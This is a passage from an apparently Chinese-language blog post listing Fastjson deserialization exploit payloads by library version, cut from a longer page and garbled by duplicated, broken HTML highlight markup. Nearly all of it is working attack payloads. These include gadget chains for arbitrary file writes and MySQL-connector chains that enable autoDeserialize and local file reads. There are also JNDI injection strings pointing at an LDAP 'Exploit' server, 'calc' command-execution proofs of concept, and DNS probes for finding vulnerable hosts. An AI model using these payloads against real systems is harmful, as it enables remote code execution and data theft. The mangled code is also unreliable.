class="hljs-string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span>,<br>        <span class="hljs-string">&quot;out&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string"><code class="language-hljs java">&#123;<br>    <span class="hljs-string">&quot;stream&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span>,<br>        <span class="hljs-string">&quot;targetPath&quot;</span>: <span class="hljs-string">&quot;f:/test/pwn.txt&quot;</span>,<br>        <span class="hljs-string">&quot;tempPath&quot;</span>: <span class="hljs-string">&quot;f:/test/test.txt&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;writer&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span>,<br>        <span class="hljs-string">&quot;buffer&quot;</span>: <span class="hljs-string">&quot;文件内容 base64 编码&quot;</span>,<br>        <span class="hljs-string">&quot;outputStream&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.stream&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;position&quot;</span>: <span class="hljs-number">5</span><br>    &#125;,<br>    <span class="hljs-string">&quot;close&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span>,<br>        <span class="hljs-string">&quot;out&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">"$.writer"</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre class=" language-hljs json">Mysqlconnector <span class="hljs-number">5.1</span>.x<br>&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,<span class="hljs-attr">&quot;hostToConnectTo&quot;</span>:<span class="hljs-string">&quot;mysql.host&quot;</span>,<span class="hljs-attr">&quot;portToConnectTo&quot;</span>:<span class="hljs-number">3306</span>,<span class="hljs-attr">&quot;info&quot;</span>:&#123;<span class="hljs-attr">&quot;user&quot;</span>:”user<span class="hljs-string">&quot;,&quot;</span>password<span class="hljs-string">&quot;:”pass&quot;</span>,<span class="hljs-attr">&quot;statementInterceptors&quot;</span>:<span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-attr">&quot;autoDeserialize&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>,<span class="hljs-attr">&quot;NUM_HOSTS&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;,<span class="hljs-attr">&quot;databaseToConnectTo&quot;</span>:”dbname<span class="hljs-string">&quot;,&quot;</span>url<span class="hljs-string">&quot;:&quot;</span><span class="hljs-string">&quot;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Mysqlconnector 6.0.2 or 6.0.3</span><br><span class="hljs-string">&#123;&quot;</span>@type<span class="hljs-string">&quot;: &quot;</span>java.lang.AutoCloseable<span class="hljs-string">&quot;,&quot;</span>@type<span class="hljs-string">&quot;: &quot;</span>com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection<span class="hljs-string">&quot;,&quot;</span>proxy<span class="hljs-string">&quot;:&#123;&quot;</span>connectionString<span class="hljs-string">&quot;:&#123;&quot;</span>url<span class="hljs-string">&quot;: &quot;</span>jdbc:mysql:<span class="hljs-comment">//localhost:3306/foo?allowLoadLocalInfile=true&quot;&#125;&#125;&#125;</span><br><br>Mysqlconnector <span class="hljs-number">6.</span>x or &lt; <span class="hljs-number">8.0</span><span class="hljs-number">.20</span><br>&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span>,<span class="hljs-attr">&quot;proxy&quot;</span>:&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span>,<span class="hljs-attr">&quot;connectionUrl&quot;</span>:&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span>, <span class="hljs-attr">&quot;masters&quot;</span>: [&#123;<span class="hljs-attr">&quot;host&quot;</span>:<span class="hljs-string">&quot;mysql.host&quot;</span>&#125;], <span class="hljs-attr">&quot;slaves&quot;</span>:[], <span class="hljs-attr">&quot;properties&quot;</span>:&#123;<span class="hljs-attr">&quot;host&quot;</span>:<span class="hljs-string">&quot;mysql.host&quot;</span>,<span class="hljs-attr">&quot;user&quot;</span>:<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-attr">&quot;dbname&quot;</span>:<span class="hljs-string">&quot;dbname&quot;</span>,<span class="hljs-attr">&quot;password&quot;</span>:<span class="hljs-string">&quot;pass&quot;</span>,<span class="hljs-attr">&quot;queryInterceptors&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-attr">&quot;autoDeserialize&quot;</span>:<span class="hljs-string"><code class="language-hljs json">Mysqlconnector <span class="hljs-number">5.1</span>.x<br>&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,<span class="hljs-attr">&quot;hostToConnectTo&quot;</span>:<span class="hljs-string">&quot;mysql.host&quot;</span>,<span class="hljs-attr">&quot;portToConnectTo&quot;</span>:<span class="hljs-number">3306</span>,<span class="hljs-attr">&quot;info&quot;</span>:&#123;<span class="hljs-attr">&quot;user&quot;</span>:”user<span class="hljs-string">&quot;,&quot;</span>password<span class="hljs-string">&quot;:”pass&quot;</span>,<span class="hljs-attr">&quot;statementInterceptors&quot;</span>:<span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-attr">&quot;autoDeserialize&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>,<span class="hljs-attr">&quot;NUM_HOSTS&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;,<span class="hljs-attr">&quot;databaseToConnectTo&quot;</span>:”dbname<span class="hljs-string">&quot;,&quot;</span>url<span class="hljs-string">&quot;:&quot;</span><span class="hljs-string">&quot;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Mysqlconnector 6.0.2 or 6.0.3</span><br><span class="hljs-string">&#123;&quot;</span>@type<span class="hljs-string">&quot;: &quot;</span>java.lang.AutoCloseable<span class="hljs-string">&quot;,&quot;</span>@type<span class="hljs-string">&quot;: &quot;</span>com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection<span class="hljs-string">&quot;,&quot;</span>proxy<span class="hljs-string">&quot;:&#123;&quot;</span>connectionString<span class="hljs-string">&quot;:&#123;&quot;</span>url<span class="hljs-string">&quot;: &quot;</span>jdbc:mysql:<span class="hljs-comment">//localhost:3306/foo?allowLoadLocalInfile=true&quot;&#125;&#125;&#125;</span><br><br>Mysqlconnector <span class="hljs-number">6.</span>x or &lt; <span class="hljs-number">8.0</span><span class="hljs-number">.20</span><br>&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span>,<span class="hljs-attr">&quot;proxy&quot;</span>:&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span>,<span class="hljs-attr">&quot;connectionUrl&quot;</span>:&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span>, <span class="hljs-attr">&quot;masters&quot;</span>: [&#123;<span class="hljs-attr">&quot;host&quot;</span>:<span class="hljs-string">&quot;mysql.host&quot;</span>&#125;], <span class="hljs-attr">&quot;slaves&quot;</span>:[], <span class="hljs-attr">&quot;properties&quot;</span>:&#123;<span class="hljs-attr">&quot;host&quot;</span>:<span class="hljs-string">&quot;mysql.host&quot;</span>,<span class="hljs-attr">&quot;user&quot;</span>:<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-attr">&quot;dbname&quot;</span>:<span class="hljs-string">&quot;dbname&quot;</span>,<span class="hljs-attr">&quot;password&quot;</span>:<span class="hljs-string">&quot;pass&quot;</span>,<span class="hljs-attr">&quot;queryInterceptors&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-attr">&quot;autoDeserialize&quot;</span>:<span class="hljs-string">"true"</span>&#125;&#125;&#125;&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre class=" language-hljs json">&#123;<br>    &#x27;@type&#x27;:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>    &#x27;@type&#x27;:&#x27;sun.rmi.server.MarshalOutputStream&#x27;,<br>    &#x27;out&#x27;:<br>    &#123;<br>        &#x27;@type&#x27;:&#x27;java.util.zip.InflaterOutputStream&#x27;,<br>        &#x27;out&#x27;:<br>        &#123;<br>           &#x27;@type&#x27;:&#x27;java.io.FileOutputStream&#x27;,<br>           &#x27;file&#x27;:&#x27;dst&#x27;,<br>           &#x27;append&#x27;:<span class="hljs-literal">false</span><br>        &#125;,<br>        &#x27;infl&#x27;:<br>        &#123;<br>            &#x27;input&#x27;:&#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;<br>        &#125;,<br>        &#x27;bufLen&#x27;:<span class="hljs-number">1048576</span><br>    &#125;,<br>    &#x27;protocolVersion&#x27;:<span class="hljs-number"><code class="language-hljs json">&#123;<br>    &#x27;@type&#x27;:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>    &#x27;@type&#x27;:&#x27;sun.rmi.server.MarshalOutputStream&#x27;,<br>    &#x27;out&#x27;:<br>    &#123;<br>        &#x27;@type&#x27;:&#x27;java.util.zip.InflaterOutputStream&#x27;,<br>        &#x27;out&#x27;:<br>        &#123;<br>           &#x27;@type&#x27;:&#x27;java.io.FileOutputStream&#x27;,<br>           &#x27;file&#x27;:&#x27;dst&#x27;,<br>           &#x27;append&#x27;:<span class="hljs-literal">false</span><br>        &#125;,<br>        &#x27;infl&#x27;:<br>        &#123;<br>            &#x27;input&#x27;:&#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;<br>        &#125;,<br>        &#x27;bufLen&#x27;:<span class="hljs-number">1048576</span><br>    &#125;,<br>    &#x27;protocolVersion&#x27;:<span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre class=" language-hljs txt"><code class="language-hljs txt">&#123;<br>    &#x27;@type&#x27;:"java.lang.AutoCloseable",<br>    &#x27;@type&#x27;:&#x27;sun.rmi.server.MarshalOutputStream&#x27;,<br>    &#x27;out&#x27;:<br>    &#123;<br>        &#x27;@type&#x27;:&#x27;java.util.zip.InflaterOutputStream&#x27;,<br>        &#x27;out&#x27;:<br>        &#123;<br>           &#x27;@type&#x27;:&#x27;java.io.FileOutputStream&#x27;,<br>           &#x27;file&#x27;:&#x27;dst&#x27;,<br>           &#x27;append&#x27;:false<br>        &#125;,<br>        &#x27;infl&#x27;:<br>        &#123;<br>            &#x27;input&#x27;:&#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;<br>        &#125;,<br>        &#x27;bufLen&#x27;:1048576<br>    &#125;,<br>    &#x27;protocolVersion&#x27;:1<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="0x11-Version-1-2-75-1-2-80"><a href="#0x11-Version-1-2-75-1-2-80" class="headerlink" title="0x11 Version 1.2.75/1.2.80"></a>0x11 Version 1.2.75/1.2.80</h1><p>类似1.2.68</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-string"><code class="language-hljs java"><span class="hljs-string">&#x27;&#123;"@type":"java.lang.Exception","@type":"com.fastjson.demo.poc.poc","s":"calc"&#125;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>具体可看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/sdihvai/article/details/111871147">https://blog.csdn.net/sdihvai/article/details/111871147</a></p>
<p>从网上看到1.2.80的POC：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs json">&#123;<br>	<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Exception&quot;</span>,<br>	<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.example.fastjson.poc20220523.Poc20220523&quot;</span>,<br>	<span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string"><code class="language-hljs json">&#123;<br>	<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Exception&quot;</span>,<br>	<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.example.fastjson.poc20220523.Poc20220523&quot;</span>,<br>	<span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">"calc"</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/YoungBear/FastjsonPoc">https://github.com/YoungBear/FastjsonPoc</a></p>
<h1 id="0x12-其他Gadget补充"><a href="#0x12-其他Gadget补充" class="headerlink" title="0x12 其他Gadget补充"></a>0x12 其他Gadget补充</h1><p>这里补充下其他一些Gadget，可自行尝试。注意，均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制。</p>
<p>1.2.59</p>
<p>com.zaxxer.hikari.HikariConfig类PoC：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="hljs-string">&quot;metricRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;<br>或<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="hljs-string">&quot;healthCheckRegistry&quot;</span>:<span class="hljs-string"><code class="language-hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="hljs-string">&quot;metricRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;<br>或<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="hljs-string">&quot;healthCheckRegistry&quot;</span>:<span class="hljs-string">"ldap://localhost:1389/Exploit"</span>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="1-2-61"><a href="#1-2-61" class="headerlink" title="1.2.61"></a>1.2.61</h2><p>org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<span class="hljs-attr">&quot;jndiName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="hljs-attr">&quot;Object&quot;</span>:<span class="hljs-string"><code class="language-hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<span class="hljs-attr">&quot;jndiName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="hljs-attr">&quot;Object&quot;</span>:<span class="hljs-string">"a"</span>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="1-2-62"><a href="#1-2-62" class="headerlink" title="1.2.62"></a>1.2.62</h2><p>org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span>, <span class="hljs-attr">&quot;parameters&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.util.Hashtable&quot;</span>,<span class="hljs-attr">&quot;java.naming.factory.initial&quot;</span>:<span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>,<span class="hljs-attr">&quot;topic-factory&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;, <span class="hljs-attr">&quot;namespace&quot;</span>:<span class="hljs-string"><code class="language-hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span>, <span class="hljs-attr">&quot;parameters&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.util.Hashtable&quot;</span>,<span class="hljs-attr">&quot;java.naming.factory.initial&quot;</span>:<span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>,<span class="hljs-attr">&quot;topic-factory&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;, <span class="hljs-attr">&quot;namespace&quot;</span>:<span class="hljs-string">""</span>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h2><p>org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="hljs-string">&quot;metricRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;<br>或<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="hljs-string">&quot;healthCheckRegistry&quot;</span>:<span class="hljs-string"><code class="language-hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="hljs-string">&quot;metricRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;<br>或<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="hljs-string">&quot;healthCheckRegistry&quot;</span>:<span class="hljs-string">"ldap://localhost:1389/Exploit"</span>&#125;<br></code></pre></td></tr></table></figure>

<p>com.caucho.config.types.ResourceRef类PoC：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.caucho.config.types.ResourceRef&quot;</span>,<span class="hljs-attr">&quot;lookupName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="hljs-attr">&quot;value&quot;</span>: &#123;<span class="hljs-attr">&quot;$ref&quot;</span>:<span class="hljs-string"><code class="language-hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.caucho.config.types.ResourceRef&quot;</span>,<span class="hljs-attr">&quot;lookupName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="hljs-attr">&quot;value&quot;</span>: &#123;<span class="hljs-attr">&quot;$ref&quot;</span>:<span class="hljs-string">"$.value"</span>&#125;&#125;<br></code></pre></td></tr></table></figure>



<h2 id="未知版本"><a href="#未知版本" class="headerlink" title="未知版本"></a>未知版本</h2><p>org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;</span>, <span class="hljs-attr">&quot;tmJndiName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="hljs-attr">&quot;tmFromJndi&quot;</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">&quot;transactionManager&quot;</span>: &#123;<span class="hljs-attr">&quot;$ref&quot;</span>:<span class="hljs-string"><code class="language-hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;</span>, <span class="hljs-attr">&quot;tmJndiName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="hljs-attr">&quot;tmFromJndi&quot;</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">&quot;transactionManager&quot;</span>: &#123;<span class="hljs-attr">&quot;$ref&quot;</span>:<span class="hljs-string">"$.transactionManager"</span>&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;</span>, <span class="hljs-attr">&quot;tmJndiName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="hljs-attr">&quot;tmFromJndi&quot;</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">&quot;transactionManager&quot;</span>: &#123;<span class="hljs-attr">&quot;$ref&quot;</span>:<span class="hljs-string"><code class="language-hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;</span>, <span class="hljs-attr">&quot;tmJndiName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="hljs-attr">&quot;tmFromJndi&quot;</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">&quot;transactionManager&quot;</span>: &#123;<span class="hljs-attr">&quot;$ref&quot;</span>:<span class="hljs-string">"$.transactionManager"</span>&#125;&#125;<br></code></pre></td></tr></table></figure>



<h2 id="DNS探测"><a href="#DNS探测" class="headerlink" title="DNS探测"></a>DNS探测</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre class=" language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet6Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="hljs-string">&quot;address&quot;</span>:,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<br><br>&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;http://dnslog&quot;</span>&#125;:<span class="hljs-string">&quot;x&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;http://dnslog&quot;</span>&#125;&#125;<span class="hljs-string">&quot;&quot;</span>&#125;<br><br>Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;http://dnslog&quot;</span>&#125;]<br><br>Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;http://dnslog&quot;</span>&#125;<br><br>&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;http://dnslog&quot;</span>&#125;:<span class="hljs-number">0</span><br><br><br>https:<span class="hljs-comment">//github.com/alibaba/fastjson/issues/3841</span><br>最新版 <span class="hljs-number">1.2</span><span class="hljs-number">.76</span> 开启safeMode<br>&#123;<span class="hljs-string">&quot;ss&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;http://xxx.dnslog.cn&quot;</span>&#125;&#125;<span class="hljs-string"><code class="language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span 